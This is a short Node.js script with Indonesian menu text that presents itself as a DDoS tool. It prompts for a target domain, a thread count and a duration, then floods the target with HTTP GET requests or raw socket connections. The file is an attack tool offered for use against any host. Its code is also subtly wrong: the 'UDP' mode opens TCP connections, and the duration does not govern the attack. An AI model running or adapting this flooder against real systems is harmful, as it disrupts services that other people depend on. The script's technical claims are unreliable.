const net = require('net');
const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Warna
const warna = {
  merah: '\x1b[31m',
  hijau: '\x1b[32m',
  biru: '\x1b[34m',
  reset: '\x1b[0m'
};

// Menu
console.log(warna.biru + "===============================");
console.log(warna.biru + "= Created By: Orang Tersakiti =");
console.log(warna.biru + "===============================");
console.log(warna.hijau + "[1] Serangan HTTP");
console.log(warna.hijau + "[2] Serangan UDP");
console.log(warna.hijau + "[3] Keluar");
console.log(warna.biru + "===============================");

// Fungsi pengaturan
function pengaturan() {
  return new Promise((resolve) => {
    rl.question(warna.merah + 'Pilih menu: ', (pilihan) => {
      if (pilihan === '3') {
        console.log(warna.hijau + 'Keluar dari aplikasi.');
        process.exit();
      }

      rl.question(warna.merah + 'Masukkan domain target: ', (targetUrl) => {
        rl.question(warna.merah + 'Masukkan jumlah thread: ', (threads) => {
          rl.question(warna.merah + 'Masukkan waktu serangan (detik): ', (waktuSerangan) => {
            resolve({ pilihan, targetUrl, threads: parseInt(threads), waktuSerangan: parseInt(waktuSerangan) });
          });
        });
      });
    });
  });
}

// Fungsi serangan HTTP
function seranganHttp(targetUrl, threads, waktuSerangan) {
  console.log(warna.hijau + `Mulai menyerang ${targetUrl} dengan ${threads} thread dalam mode HTTP...`);
  for (let i = 0; i < threads; i++) {
    const req = http.get(`http://${targetUrl}`, (res) => {
      res.on('data', () => {});
    });
    req.on('error', (err) => {
      console.error(err);
    });
  }
  setTimeout(() => {
    console.log(warna.hijau + 'Serangan selesai.');
  }, waktuSerangan * 1000);
}

// Fungsi serangan UDP
function seranganUdp(targetUrl, threads, waktuSerangan) {
  console.log(warna.hijau + `Mulai menyerang ${targetUrl} dengan ${threads} thread dalam mode UDP...`);
  for (let i = 0; i < threads; i++) {
    const socket = new net.Socket();
    socket.connect(80, targetUrl, () => {
      socket.write('UDP');
    });
    socket.on('error', (err) => {
      console.error(err);
    });
  }
  setTimeout(() => {
    console.log(warna.hijau + 'Serangan selesai.');
  }, waktuSerangan * 1000);
}

// Jalankan simulasi
pengaturan().then((config) => {
  switch (config.pilihan) {
    case '1':
      seranganHttp(config.targetUrl, config.threads, config.waktuSerangan);
      break;
    case '2':
      seranganUdp(config.targetUrl, config.threads, config.waktuSerangan);
      break;
    default:
      console.log(warna.merah + 'Pilihan tidak valid.');
  }
  rl.close();
});
